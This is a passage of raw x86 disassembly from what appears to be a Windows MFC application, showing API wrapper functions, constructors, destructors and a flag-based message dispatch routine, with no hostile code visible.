  402bbe:	ff 15 4c 80 41 00    	call   *0x41804c
  402bc4:	c2 08 00             	ret    $0x8
  402bc7:	90                   	nop
  402bc8:	90                   	nop
  402bc9:	90                   	nop
  402bca:	90                   	nop
  402bcb:	90                   	nop
  402bcc:	90                   	nop
  402bcd:	90                   	nop
  402bce:	90                   	nop
  402bcf:	90                   	nop
  402bd0:	8b 44 24 04          	mov    0x4(%esp),%eax
  402bd4:	8b 49 04             	mov    0x4(%ecx),%ecx
  402bd7:	50                   	push   %eax
  402bd8:	51                   	push   %ecx
  402bd9:	ff 15 48 80 41 00    	call   *0x418048
  402bdf:	c2 04 00             	ret    $0x4
  402be2:	90                   	nop
  402be3:	90                   	nop
  402be4:	90                   	nop
  402be5:	90                   	nop
  402be6:	90                   	nop
  402be7:	90                   	nop
  402be8:	90                   	nop
  402be9:	90                   	nop
  402bea:	90                   	nop
  402beb:	90                   	nop
  402bec:	90                   	nop
  402bed:	90                   	nop
  402bee:	90                   	nop
  402bef:	90                   	nop
  402bf0:	8b 44 24 10          	mov    0x10(%esp),%eax
  402bf4:	8b 54 24 0c          	mov    0xc(%esp),%edx
  402bf8:	50                   	push   %eax
  402bf9:	8b 44 24 0c          	mov    0xc(%esp),%eax
  402bfd:	52                   	push   %edx
  402bfe:	8b 54 24 0c          	mov    0xc(%esp),%edx
  402c02:	50                   	push   %eax
  402c03:	8b 41 04             	mov    0x4(%ecx),%eax
  402c06:	52                   	push   %edx
  402c07:	50                   	push   %eax
  402c08:	ff 15 44 80 41 00    	call   *0x418044
  402c0e:	c2 10 00             	ret    $0x10
  402c11:	90                   	nop
  402c12:	90                   	nop
  402c13:	90                   	nop
  402c14:	90                   	nop
  402c15:	90                   	nop
  402c16:	90                   	nop
  402c17:	90                   	nop
  402c18:	90                   	nop
  402c19:	90                   	nop
  402c1a:	90                   	nop
  402c1b:	90                   	nop
  402c1c:	90                   	nop
  402c1d:	90                   	nop
  402c1e:	90                   	nop
  402c1f:	90                   	nop
  402c20:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  402c24:	8b 54 24 18          	mov    0x18(%esp),%edx
  402c28:	50                   	push   %eax
  402c29:	8b 44 24 18          	mov    0x18(%esp),%eax
  402c2d:	8b 49 04             	mov    0x4(%ecx),%ecx
  402c30:	52                   	push   %edx
  402c31:	8b 54 24 18          	mov    0x18(%esp),%edx
  402c35:	50                   	push   %eax
  402c36:	8b 44 24 18          	mov    0x18(%esp),%eax
  402c3a:	52                   	push   %edx
  402c3b:	8b 54 24 18          	mov    0x18(%esp),%edx
  402c3f:	50                   	push   %eax
  402c40:	8b 44 24 18          	mov    0x18(%esp),%eax
  402c44:	52                   	push   %edx
  402c45:	50                   	push   %eax
  402c46:	51                   	push   %ecx
  402c47:	ff 15 40 80 41 00    	call   *0x418040
  402c4d:	c2 1c 00             	ret    $0x1c
  402c50:	8b 44 24 20          	mov    0x20(%esp),%eax
  402c54:	8b 54 24 1c          	mov    0x1c(%esp),%edx
  402c58:	50                   	push   %eax
  402c59:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  402c5d:	8b 49 04             	mov    0x4(%ecx),%ecx
  402c60:	52                   	push   %edx
  402c61:	8b 54 24 1c          	mov    0x1c(%esp),%edx
  402c65:	50                   	push   %eax
  402c66:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  402c6a:	52                   	push   %edx
  402c6b:	8b 54 24 1c          	mov    0x1c(%esp),%edx
  402c6f:	50                   	push   %eax
  402c70:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  402c74:	52                   	push   %edx
  402c75:	50                   	push   %eax
  402c76:	51                   	push   %ecx
  402c77:	ff 15 08 86 41 00    	call   *0x418608
  402c7d:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  402c81:	0f bf d0             	movswl %ax,%edx
  402c84:	c1 e8 10             	shr    $0x10,%eax
  402c87:	0f bf c0             	movswl %ax,%eax
  402c8a:	89 41 04             	mov    %eax,0x4(%ecx)
  402c8d:	89 11                	mov    %edx,(%ecx)
  402c8f:	8b c1                	mov    %ecx,%eax
  402c91:	c2 20 00             	ret    $0x20
  402c94:	90                   	nop
  402c95:	90                   	nop
  402c96:	90                   	nop
  402c97:	90                   	nop
  402c98:	90                   	nop
  402c99:	90                   	nop
  402c9a:	90                   	nop
  402c9b:	90                   	nop
  402c9c:	90                   	nop
  402c9d:	90                   	nop
  402c9e:	90                   	nop
  402c9f:	90                   	nop
  402ca0:	8b 44 24 10          	mov    0x10(%esp),%eax
  402ca4:	8b 54 24 0c          	mov    0xc(%esp),%edx
  402ca8:	50                   	push   %eax
  402ca9:	8b 44 24 0c          	mov    0xc(%esp),%eax
  402cad:	52                   	push   %edx
  402cae:	8b 54 24 0c          	mov    0xc(%esp),%edx
  402cb2:	50                   	push   %eax
  402cb3:	8b 41 04             	mov    0x4(%ecx),%eax
  402cb6:	52                   	push   %edx
  402cb7:	50                   	push   %eax
  402cb8:	ff 15 a4 86 41 00    	call   *0x4186a4
  402cbe:	c2 10 00             	ret    $0x10
  402cc1:	90                   	nop
  402cc2:	90                   	nop
  402cc3:	90                   	nop
  402cc4:	90                   	nop
  402cc5:	90                   	nop
  402cc6:	90                   	nop
  402cc7:	90                   	nop
  402cc8:	90                   	nop
  402cc9:	90                   	nop
  402cca:	90                   	nop
  402ccb:	90                   	nop
  402ccc:	90                   	nop
  402ccd:	90                   	nop
  402cce:	90                   	nop
  402ccf:	90                   	nop
  402cd0:	8b 44 24 04          	mov    0x4(%esp),%eax
  402cd4:	85 c0                	test   %eax,%eax
  402cd6:	74 03                	je     0x402cdb
  402cd8:	8b 40 04             	mov    0x4(%eax),%eax
  402cdb:	8b 54 24 20          	mov    0x20(%esp),%edx
  402cdf:	52                   	push   %edx
  402ce0:	8b 54 24 20          	mov    0x20(%esp),%edx
  402ce4:	52                   	push   %edx
  402ce5:	8b 54 24 20          	mov    0x20(%esp),%edx
  402ce9:	52                   	push   %edx
  402cea:	8b 54 24 20          	mov    0x20(%esp),%edx
  402cee:	52                   	push   %edx
  402cef:	8b 54 24 20          	mov    0x20(%esp),%edx
  402cf3:	52                   	push   %edx
  402cf4:	8b 54 24 20          	mov    0x20(%esp),%edx
  402cf8:	52                   	push   %edx
  402cf9:	8b 54 24 20          	mov    0x20(%esp),%edx
  402cfd:	52                   	push   %edx
  402cfe:	50                   	push   %eax
  402cff:	8b 41 04             	mov    0x4(%ecx),%eax
  402d02:	50                   	push   %eax
  402d03:	ff 15 9c 86 41 00    	call   *0x41869c
  402d09:	c2 20 00             	ret    $0x20
  402d0c:	90                   	nop
  402d0d:	90                   	nop
  402d0e:	90                   	nop
  402d0f:	90                   	nop
  402d10:	8b 44 24 10          	mov    0x10(%esp),%eax
  402d14:	8b 54 24 0c          	mov    0xc(%esp),%edx
  402d18:	50                   	push   %eax
  402d19:	8b 44 24 0c          	mov    0xc(%esp),%eax
  402d1d:	52                   	push   %edx
  402d1e:	8b 54 24 0c          	mov    0xc(%esp),%edx
  402d22:	50                   	push   %eax
  402d23:	8b 41 04             	mov    0x4(%ecx),%eax
  402d26:	52                   	push   %edx
  402d27:	50                   	push   %eax
  402d28:	ff 15 3c 80 41 00    	call   *0x41803c
  402d2e:	c2 10 00             	ret    $0x10
  402d31:	90                   	nop
  402d32:	90                   	nop
  402d33:	90                   	nop
  402d34:	90                   	nop
  402d35:	90                   	nop
  402d36:	90                   	nop
  402d37:	90                   	nop
  402d38:	90                   	nop
  402d39:	90                   	nop
  402d3a:	90                   	nop
  402d3b:	90                   	nop
  402d3c:	90                   	nop
  402d3d:	90                   	nop
  402d3e:	90                   	nop
  402d3f:	90                   	nop
  402d40:	56                   	push   %esi
  402d41:	8b f1                	mov    %ecx,%esi
  402d43:	e8 e2 12 01 00       	call   0x41402a
  402d48:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  402d4d:	74 09                	je     0x402d58
  402d4f:	56                   	push   %esi
  402d50:	e8 5b 11 01 00       	call   0x413eb0
  402d55:	83 c4 04             	add    $0x4,%esp
  402d58:	8b c6                	mov    %esi,%eax
  402d5a:	5e                   	pop    %esi
  402d5b:	c2 04 00             	ret    $0x4
  402d5e:	90                   	nop
  402d5f:	90                   	nop
  402d60:	56                   	push   %esi
  402d61:	8b f1                	mov    %ecx,%esi
  402d63:	e8 4e 14 01 00       	call   0x4141b6
  402d68:	c7 06 a0 8a 41 00    	movl   $0x418aa0,(%esi)
  402d6e:	8b c6                	mov    %esi,%eax
  402d70:	5e                   	pop    %esi
  402d71:	c3                   	ret
  402d72:	90                   	nop
  402d73:	90                   	nop
  402d74:	90                   	nop
  402d75:	90                   	nop
  402d76:	90                   	nop
  402d77:	90                   	nop
  402d78:	90                   	nop
  402d79:	90                   	nop
  402d7a:	90                   	nop
  402d7b:	90                   	nop
  402d7c:	90                   	nop
  402d7d:	90                   	nop
  402d7e:	90                   	nop
  402d7f:	90                   	nop
  402d80:	56                   	push   %esi
  402d81:	8b f1                	mov    %ecx,%esi
  402d83:	e8 18 00 00 00       	call   0x402da0
  402d88:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  402d8d:	74 09                	je     0x402d98
  402d8f:	56                   	push   %esi
  402d90:	e8 1b 11 01 00       	call   0x413eb0
  402d95:	83 c4 04             	add    $0x4,%esp
  402d98:	8b c6                	mov    %esi,%eax
  402d9a:	5e                   	pop    %esi
  402d9b:	c2 04 00             	ret    $0x4
  402d9e:	90                   	nop
  402d9f:	90                   	nop
  402da0:	c7 01 a0 8a 41 00    	movl   $0x418aa0,(%ecx)
  402da6:	e9 11 14 01 00       	jmp    0x4141bc
  402dab:	90                   	nop
  402dac:	90                   	nop
  402dad:	90                   	nop
  402dae:	90                   	nop
  402daf:	90                   	nop
  402db0:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  402db6:	6a ff                	push   $0xffffffff
  402db8:	68 07 4c 41 00       	push   $0x414c07
  402dbd:	50                   	push   %eax
  402dbe:	b8 24 20 00 00       	mov    $0x2024,%eax
  402dc3:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  402dca:	e8 91 17 01 00       	call   0x414560
  402dcf:	8b 84 24 34 20 00 00 	mov    0x2034(%esp),%eax
  402dd6:	56                   	push   %esi
  402dd7:	57                   	push   %edi
  402dd8:	8b f9                	mov    %ecx,%edi
  402dda:	85 c0                	test   %eax,%eax
  402ddc:	74 13                	je     0x402df1
  402dde:	6a 00                	push   $0x0
  402de0:	6a 00                	push   $0x0
  402de2:	68 b4 e0 41 00       	push   $0x41e0b4
  402de7:	e8 ee 13 01 00       	call   0x4141da
  402dec:	e9 02 02 00 00       	jmp    0x402ff3
  402df1:	e8 de 13 01 00       	call   0x4141d4
  402df6:	85 c0                	test   %eax,%eax
  402df8:	74 0b                	je     0x402e05
  402dfa:	8b 10                	mov    (%eax),%edx
  402dfc:	8b c8                	mov    %eax,%ecx
  402dfe:	ff 52 7c             	call   *0x7c(%edx)
  402e01:	8b f0                	mov    %eax,%esi
  402e03:	eb 02                	jmp    0x402e07
  402e05:	33 f6                	xor    %esi,%esi
  402e07:	8b 07                	mov    (%edi),%eax
  402e09:	6a 00                	push   $0x0
  402e0b:	8d 4c 24 24          	lea    0x24(%esp),%ecx
  402e0f:	68 0c 20 00 00       	push   $0x200c
  402e14:	51                   	push   %ecx
  402e15:	8b cf                	mov    %edi,%ecx
  402e17:	ff 50 1c             	call   *0x1c(%eax)
  402e1a:	85 c0                	test   %eax,%eax
  402e1c:	7d 13                	jge    0x402e31
  402e1e:	6a 00                	push   $0x0
  402e20:	6a 00                	push   $0x0
  402e22:	68 a4 e0 41 00       	push   $0x41e0a4
  402e27:	e8 ae 13 01 00       	call   0x4141da
  402e2c:	e9 c2 01 00 00       	jmp    0x402ff3
  402e31:	8b ce                	mov    %esi,%ecx
  402e33:	e8 d8 ec 00 00       	call   0x411b10
  402e38:	8b 44 24 20          	mov    0x20(%esp),%eax
  402e3c:	83 f8 01             	cmp    $0x1,%eax
  402e3f:	75 11                	jne    0x402e52
  402e41:	8d 54 24 20          	lea    0x20(%esp),%edx
  402e45:	8b ce                	mov    %esi,%ecx
  402e47:	52                   	push   %edx
  402e48:	e8 e3 9b 00 00       	call   0x40ca30
  402e4d:	e9 a1 01 00 00       	jmp    0x402ff3
  402e52:	83 f8 02             	cmp    $0x2,%eax
  402e55:	75 11                	jne    0x402e68
  402e57:	8d 44 24 20          	lea    0x20(%esp),%eax
  402e5b:	8b ce                	mov    %esi,%ecx
  402e5d:	50                   	push   %eax
  402e5e:	e8 5d 9c 00 00       	call   0x40cac0
  402e63:	e9 8b 01 00 00       	jmp    0x402ff3
  402e68:	83 f8 04             	cmp    $0x4,%eax
  402e6b:	75 11                	jne    0x402e7e
  402e6d:	8d 4c 24 20          	lea    0x20(%esp),%ecx
  402e71:	51                   	push   %ecx
  402e72:	8b ce                	mov    %esi,%ecx
  402e74:	e8 c7 ec 00 00       	call   0x411b40
  402e79:	e9 75 01 00 00       	jmp    0x402ff3
  402e7e:	83 f8 40             	cmp    $0x40,%eax
  402e81:	75 0f                	jne    0x402e92
  402e83:	c7 86 3c 01 00 00 00 	movl   $0x0,0x13c(%esi)
  402e8a:	00 00 00 
  402e8d:	e9 61 01 00 00       	jmp    0x402ff3
  402e92:	3d 80 00 00 00       	cmp    $0x80,%eax
  402e97:	75 11                	jne    0x402eaa
  402e99:	8d 54 24 20          	lea    0x20(%esp),%edx
  402e9d:	8b ce                	mov    %esi,%ecx
  402e9f:	52                   	push   %edx
  402ea0:	e8 bb dc 00 00       	call   0x410b60
  402ea5:	e9 49 01 00 00       	jmp    0x402ff3
  402eaa:	83 f8 08             	cmp    $0x8,%eax
  402ead:	75 11                	jne    0x402ec0
  402eaf:	8d 44 24 20          	lea    0x20(%esp),%eax
  402eb3:	8b ce                	mov    %esi,%ecx
  402eb5:	50                   	push   %eax
  402eb6:	e8 25 b8 00 00       	call   0x40e6e0
  402ebb:	e9 33 01 00 00       	jmp    0x402ff3
  402ec0:	83 f8 10             	cmp    $0x10,%eax
  402ec3:	75 11                	jne    0x402ed6
  402ec5:	8d 4c 24 20          	lea    0x20(%esp),%ecx
  402ec9:	51                   	push   %ecx
  402eca:	8b ce                	mov    %esi,%ecx
  402ecc:	e8 ef b9 00 00       	call   0x40e8c0
  402ed1:	e9 1d 01 00 00       	jmp    0x402ff3
  402ed6:	83 f8 20             	cmp    $0x20,%eax
  402ed9:	0f 85 01 01 00 00    	jne    0x402fe0
  402edf:	83 7c 24 24 02       	cmpl   $0x2,0x24(%esp)
  402ee4:	0f 85 09 01 00 00    	jne    0x402ff3
  402eea:	8d 54 24 18          	lea    0x18(%esp),%edx
  402eee:	8b ce                	mov    %esi,%ecx
  402ef0:	52                   	push   %edx
  402ef1:	e8 0a d0 00 00       	call   0x40ff00
  402ef6:	8b f8                	mov    %eax,%edi
  402ef8:	8d 44 24 10          	lea    0x10(%esp),%eax
  402efc:	8b ce                	mov    %esi,%ecx
  402efe:	50                   	push   %eax
  402eff:	c7 84 24 38 20 00 00 	movl   $0x0,0x2038(%esp)
  402f06:	00 00 00 00 
  402f0a:	e8 91 d1 00 00       	call   0x4100a0
  402f0f:	50                   	push   %eax
  402f10:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  402f14:	68 98 e0 41 00       	push   $0x41e098
  402f19:	51                   	push   %ecx
  402f1a:	c6 84 24 40 20 00 00 	movb   $0x1,0x2040(%esp)
  402f21:	01 
  402f22:	e8 a7 12 01 00       	call   0x4141ce
  402f27:	68 88 e0 41 00       	push   $0x41e088
  402f2c:	8d 54 24 18          	lea    0x18(%esp),%edx
  402f30:	50                   	push   %eax
  402f31:	52                   	push   %edx
  402f32:	c6 84 24 40 20 00 00 	movb   $0x2,0x2040(%esp)
  402f39:	02 
  402f3a:	e8 89 12 01 00       	call   0x4141c8
  402f3f:	57                   	push   %edi
  402f40:	50                   	push   %eax
  402f41:	8d 44 24 24          	lea    0x24(%esp),%eax
  402f45:	c6 84 24 3c 20 00 00 	movb   $0x3,0x203c(%esp)
  402f4c:	03 
  402f4d:	50                   	push   %eax
  402f4e:	e8 6f 12 01 00       	call   0x4141c2
  402f53:	68 7c e0 41 00       	push   $0x41e07c
  402f58:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  402f5c:	50                   	push   %eax
  402f5d:	51                   	push   %ecx
  402f5e:	c6 84 24 40 20 00 00 	movb   $0x4,0x2040(%esp)
  402f65:	04 
  402f66:	e8 5d 12 01 00       	call   0x4141c8
  402f6b:	8b 00                	mov    (%eax),%eax
  402f6d:	6a 30                	push   $0x30
  402f6f:	68 68 e0 41 00       	push   $0x41e068
  402f74:	50                   	push   %eax
  402f75:	6a 00                	push   $0x0
  402f77:	ff 15 34 86 41 00    	call   *0x418634
  402f7d:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  402f81:	e8 52 11 01 00       	call   0x4140d8
  402f86:	8d 4c 24 1c          	lea    0x1c(%esp),%ecx
  402f8a:	c6 84 24 34 20 00 00 	movb   $0x3,0x2034(%esp)
  402f91:	03 
  402f92:	e8 41 11 01 00       	call   0x4140d8
  402f97:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  402f9b:	c6 84 24 34 20 00 00 	movb   $0x2,0x2034(%esp)
  402fa2:	02 
  402fa3:	e8 30 11 01 00       	call   0x4140d8
  402fa8:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  402fac:	c6 84 24 34 20 00 00 	movb   $0x1,0x2034(%esp)
  402fb3:	01 
  402fb4:	e8 1f 11 01 00       	call   0x4140d8
  402fb9:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  402fbd:	c6 84 24 34 20 00 00 	movb   $0x0,0x2034(%esp)
  402fc4:	00 
  402fc5:	e8 0e 11 01 00       	call   0x4140d8
  402fca:	8d 4c 24 18          	lea    0x18(%esp),%ecx
  402fce:	c7 84 24 34 20 00 00 	movl   $0xffffffff,0x2034(%esp)
  402fd5:	ff ff ff ff 
  402fd9:	e8 fa 10 01 00       	call   0x4140d8
  402fde:	eb 13                	jmp    0x402ff3
  402fe0:	3d 00 01 00 00       	cmp    $0x100,%eax
  402fe5:	75 0c                	jne    0x402ff3
  402fe7:	8d 54 24 20          	lea    0x20(%esp),%edx
  402feb:	8b ce                	mov    %esi,%ecx
  402fed:	52                   	push   %edx
  402fee:	e8 5d e1 00 00       	call   0x411150
  402ff3:	8b 8c 24 2c 20 00 00 	mov    0x202c(%esp),%ecx
  402ffa:	5f                   	pop    %edi
  402ffb:	5e                   	pop    %esi
  402ffc:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  403003:	81 c4 30 20 00 00    	add    $0x2030,%esp
  403009:	c2 04 00             	ret    $0x4
  40300c:	90                   	nop
  40300d:	90                   	nop
  40300e:	90                   	nop
  40300f:	90                   	nop
  403010:	6a ff                	push   $0xffffffff
  403012:	68 33 4c 41 00       	push   $0x414c33
  403017:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  40301d:	50                   	push   %eax
  40301e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  403025:	51                   	push   %ecx
  403026:	56                   	push   %esi
  403027:	8b f1                	mov    %ecx,%esi
  403029:	57                   	push   %edi
  40302a:	89 74 24 08          	mov    %esi,0x8(%esp)
  40302e:	e8 09 10 01 00       	call   0x41403c
  403033:	8d 7e 48             	lea    0x48(%esi),%edi
  403036:	33 c0                	xor    %eax,%eax
  403038:	89 44 24 14          	mov    %eax,0x14(%esp)
  40303c:	89 47 04             	mov    %eax,0x4(%edi)
  40303f:	c7 07 e8 8b 41 00    	movl   $0x418be8,(%edi)
  403045:	68 ff ff ff 00       	push   $0xffffff
  40304a:	c6 44 24 18 01       	movb   $0x1,0x18(%esp)
  40304f:	c7 06 28 8b 41 00    	movl   $0x418b28,(%esi)
  403055:	c7 46 40 00 00 ff 00 	movl   $0xff0000,0x40(%esi)
  40305c:	c7 46 44 ff ff ff 00 	movl   $0xffffff,0x44(%esi)
  403063:	ff 15 38 80 41 00    	call   *0x418038
  403069:	50                   	push   %eax
  40306a:	8b cf                	mov    %edi,%ecx
  40306c:	e8 d9 10 01 00       	call   0x41414a
  403071:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  403075:	8b c6                	mov    %esi,%eax
  403077:	5f                   	pop    %edi
  403078:	5e                   	pop    %esi
  403079:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  403080:	83 c4 10             	add    $0x10,%esp
  403083:	c3                   	ret
  403084:	90                   	nop
  403085:	90                   	nop
  403086:	90                   	nop
  403087:	90                   	nop
  403088:	90                   	nop
  403089:	90                   	nop
  40308a:	90                   	nop
  40308b:	90                   	nop
  40308c:	90                   	nop
  40308d:	90                   	nop
  40308e:	90                   	nop
  40308f:	90                   	nop
  403090:	56                   	push   %esi
  403091:	8b f1                	mov    %ecx,%esi
  403093:	e8 18 00 00 00       	call   0x4030b0
  403098:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  40309d:	74 09                	je     0x4030a8
  40309f:	56                   	push   %esi
  4030a0:	e8 0b 0e 01 00       	call   0x413eb0
  4030a5:	83 c4 04             	add    $0x4,%esp
  4030a8:	8b c6                	mov    %esi,%eax
  4030aa:	5e                   	pop    %esi
  4030ab:	c2 04 00             	ret    $0x4
  4030ae:	90                   	nop
  4030af:	90                   	nop
  4030b0:	6a ff                	push   $0xffffffff
  4030b2:	68 50 4c 41 00       	push   $0x414c50
  4030b7:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4030bd:	50                   	push   %eax
  4030be:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  4030c5:	83 ec 08             	sub    $0x8,%esp
  4030c8:	56                   	push   %esi
  4030c9:	8b f1                	mov    %ecx,%esi
  4030cb:	57                   	push   %edi
  4030cc:	89 74 24 08          	mov    %esi,0x8(%esp)
  4030d0:	c7 06 28 8b 41 00    	movl   $0x418b28,(%esi)
  4030d6:	8d 7e 48             	lea    0x48(%esi),%edi
  4030d9:	c7 44 24 18 00 00 00 	movl   $0x0,0x18(%esp)
  4030e0:	00 
  4030e1:	89 7c 24 0c          	mov    %edi,0xc(%esp)
  4030e5:	c7 07 08 8a 41 00    	movl   $0x418a08,(%edi)
  4030eb:	8b cf                	mov    %edi,%ecx
  4030ed:	c6 44 24 18 01       	movb   $0x1,0x18(%esp)
  4030f2:	e8 57 0f 01 00       	call   0x41404e
  4030f7:	8b ce                	mov    %esi,%ecx
  4030f9:	c7 07 f4 89 41 00    	movl   $0x4189f4,(%edi)
  4030ff:	c7 44 24 18 ff ff ff 	movl   $0xffffffff,0x18(%esp)
  403106:	ff 
  403107:	e8 e0 10 01 00       	call   0x4141ec
  40310c:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  403110:	5f                   	pop    %edi
  403111:	5e                   	pop    %esi
  403112:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  403119:	83 c4 14             	add    $0x14,%esp
  40311c:	c3                   	ret
  40311d:	90                   	nop
  40311e:	90                   	nop
  40311f:	90                   	nop
  403120:	b8 20 8b 41 00       	mov    $0x418b20,%eax
  403125:	c3                   	ret
  403126:	90                   	nop
  403127:	90                   	nop
  403128:	90                   	nop
  403129:	90                   	nop
  40312a:	90                   	nop
  40312b:	90                   	nop
  40312c:	90                   	nop
  40312d:	90                   	nop
  40312e:	90                   	nop
  40312f:	90                   	nop
  403130:	56                   	push   %esi
  403131:	8b f1                	mov    %ecx,%esi
  403133:	57                   	push   %edi
  403134:	8b 7c 24 0c          	mov    0xc(%esp),%edi
  403138:	8b 4e 40             	mov    0x40(%esi),%ecx
  40313b:	8b 07                	mov    (%edi),%eax
  40313d:	51                   	push   %ecx
  40313e:	8b cf                	mov    %edi,%ecx
  403140:	ff 50 38             	call   *0x38(%eax)
  403143:	8b 46 44             	mov    0x44(%esi),%eax
  403146:	8b 17                	mov    (%edi),%edx
  403148:	50                   	push   %eax
  403149:	8b cf                	mov    %edi,%ecx
  40314b:	ff 52 34             	call   *0x34(%edx)
  40314e:	8d 46 48             	lea    0x48(%esi),%eax
  403151:	5f                   	pop    %edi
  403152:	85 c0                	test   %eax,%eax
  403154:	5e                   	pop    %esi
  403155:	75 03                	jne    0x40315a
  403157:	c2 08 00             	ret    $0x8
  40315a:	8b 40 04             	mov    0x4(%eax),%eax
  40315d:	c2 08 00             	ret    $0x8
  403160:	56                   	push   %esi
  403161:	8b f1                	mov    %ecx,%esi
  403163:	e8 28 f9 ff ff       	call   0x402a90
  403168:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  40316d:	74 09                	je     0x403178
  40316f:	56                   	push   %esi
  403170:	e8 3b 0d 01 00       	call   0x413eb0
  403175:	83 c4 04             	add    $0x4,%esp
  403178:	8b c6                	mov    %esi,%eax
  40317a:	5e                   	pop    %esi
  40317b:	c2 04 00             	ret    $0x4
  40317e:	90                   	nop
  40317f:	90                   	nop
  403180:	6a ff                	push   $0xffffffff
  403182:	68 81 4c 41 00       	push   $0x414c81
  403187:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  40318d:	50                   	push   %eax
  40318e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  403195:	51                   	push   %ecx
  403196:	8b 44 24 14          	mov    0x14(%esp),%eax
  40319a:	56                   	push   %esi
  40319b:	57                   	push   %edi
  40319c:	8b f1                	mov    %ecx,%esi
  40319e:	50                   	push   %eax
  40319f:	68 82 00 00 00       	push   $0x82
  4031a4:	89 74 24 10          	mov    %esi,0x10(%esp)
  4031a8:	e8 17 0e 01 00       	call   0x413fc4
  4031ad:	8d 7e 60             	lea    0x60(%esi),%edi
  4031b0:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
  4031b7:	00 
  4031b8:	8b cf                	mov    %edi,%ecx
  4031ba:	e8 7d 0e 01 00       	call   0x41403c
  4031bf:	c7 07 f8 8c 41 00    	movl   $0x418cf8,(%edi)
  4031c5:	8d be a0 00 00 00    	lea    0xa0(%esi),%edi
  4031cb:	c6 44 24 14 01       	movb   $0x1,0x14(%esp)
  4031d0:	8b cf                	mov    %edi,%ecx
  4031d2:	e8 1f 0f 01 00       	call   0x4140f6
  4031d7:	68 a8 af 46 00       	push   $0x46afa8
  4031dc:	8b cf                	mov    %edi,%ecx
  4031de:	c6 44 24 18 02       	movb   $0x2,0x18(%esp)
  4031e3:	c7 06 20 8c 41 00    	movl   $0x418c20,(%esi)
  4031e9:	e8 2e 10 01 00       	call   0x41421c
  4031ee:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  4031f2:	c7 86 a4 00 00 00 fc 	movl   $0x8fc,0xa4(%esi)
  4031f9:	08 00 00 
  4031fc:	8b c6                	mov    %esi,%eax
  4031fe:	5f                   	pop    %edi
  4031ff:	5e                   	pop    %esi
  403200:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  403207:	83 c4 10             	add    $0x10,%esp
  40320a:	c2 04 00             	ret    $0x4
  40320d:	90                   	nop
  40320e:	90                   	nop
  40320f:	90                   	nop
  403210:	56                   	push   %esi
  403211:	8b f1                	mov    %ecx,%esi
  403213:	e8 18 00 00 00       	call   0x403230
  403218:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  40321d:	74 09                	je     0x403228
  40321f:	56                   	push   %esi
  403220:	e8 8b 0c 01 00       	call   0x413eb0
  403225:	83 c4 04             	add    $0x4,%esp
  403228:	8b c6                	mov    %esi,%eax
  40322a:	5e                   	pop    %esi
  40322b:	c2 04 00             	ret    $0x4
  40322e:	90                   	nop
  40322f:	90                   	nop
  403230:	6a ff                	push   $0xffffffff
  403232:	68 a3 4c 41 00       	push   $0x414ca3
  403237:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  40323d:	50                   	push   %eax
  40323e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  403245:	51                   	push   %ecx
  403246:	56                   	push   %esi
  403247:	8b f1                	mov    %ecx,%esi
  403249:	89 74 24 04          	mov    %esi,0x4(%esp)
  40324d:	8d 8e a0 00 00 00    	lea    0xa0(%esi),%ecx
  403253:	c7 44 24 10 01 00 00 	movl   $0x1,0x10(%esp)
  40325a:	00 
  40325b:	e8 78 0e 01 00       	call   0x4140d8
  403260:	8d 4e 60             	lea    0x60(%esi),%ecx
  403263:	c6 44 24 10 00       	movb   $0x0,0x10(%esp)
  403268:	e8 a9 0f 01 00       	call   0x414216
  40326d:	8b ce                	mov    %esi,%ecx
  40326f:	c7 44 24 10 ff ff ff 	movl   $0xffffffff,0x10(%esp)
  403276:	ff 
  403277:	e8 42 0d 01 00       	call   0x413fbe
  40327c:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  403280:	5e                   	pop    %esi
  403281:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  403288:	83 c4 10             	add    $0x10,%esp
  40328b:	c3                   	ret
  40328c:	90                   	nop
  40328d:	90                   	nop
  40328e:	90                   	nop
  40328f:	90                   	nop
  403290:	56                   	push   %esi
  403291:	8b f1                	mov    %ecx,%esi
  403293:	57                   	push   %edi
  403294:	8b 7c 24 0c          	mov    0xc(%esp),%edi
  403298:	8d 46 60             	lea    0x60(%esi),%eax
  40329b:	50                   	push   %eax
  40329c:	68 f5 03 00 00       	push   $0x3f5
  4032a1:	57                   	push   %edi
  4032a2:	e8 23 0d 01 00       	call   0x413fca
  4032a7:	81 c6 a0 00 00 00    	add    $0xa0,%esi
  4032ad:	56                   	push   %esi
  4032ae:	68 f5 03 00 00       	push   $0x3f5
  4032b3:	57                   	push   %edi
  4032b4:	e8 69 0f 01 00       	call   0x414222
  4032b9:	5f                   	pop    %edi
  4032ba:	5e                   	pop    %esi
